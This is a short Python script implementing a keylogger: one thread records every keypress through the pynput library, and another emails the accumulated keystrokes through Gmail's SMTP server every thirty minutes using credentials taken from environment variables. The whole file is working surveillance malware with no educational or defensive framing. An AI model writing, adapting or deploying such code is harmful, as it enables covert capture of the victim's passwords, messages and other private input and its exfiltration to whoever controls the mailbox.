from pynput.keyboard import Key, Listener
import logging, smtplib, time, datetime, threading, os
from threading import Thread

def func1():
    global message
    email = os.environ.get('EMAIL_NAME')
    password = os.environ.get('EMAIL_PASS')
    send_to_email = os.environ.get('EMAIL_NAME')
    message = []

    session_exit = False
    email_time = datetime.datetime(1,1,1).now().time()
    email_no = 0
    print('Setup Done')

    while session_exit == False:
        time_now = datetime.datetime(1,1,1).now().time()
        if time_now >= email_time:
            email_no += 1
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            sending = 'Email No: {}\n\n{}'.format(email_no,''.join(message).replace("'", ''))
            server.sendmail(email, send_to_email , sending)
            server.quit()
            print('\n--------------------------EMAIL SENT----------------------------')
            print('Email No: {}'.format(email_no))
            print('Message: {}'.format(sending))
            print('--------------------------EMAIL SENT----------------------------\n')
            message = []
            email_time = (datetime.datetime(1,1,1).now() + datetime.timedelta(0,1800)).time()

def func2():
    def on_press(key):
        if str(key) == 'Key.space':
            key = ' '
        elif str(key) == 'Key.backspace':
            print('Backspace')
            if len(message) > 0:
                del message[-1]
            key = ''
        if key != '':
            message.append(str(key))
        print('Keydown: {}'.format(key))
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()
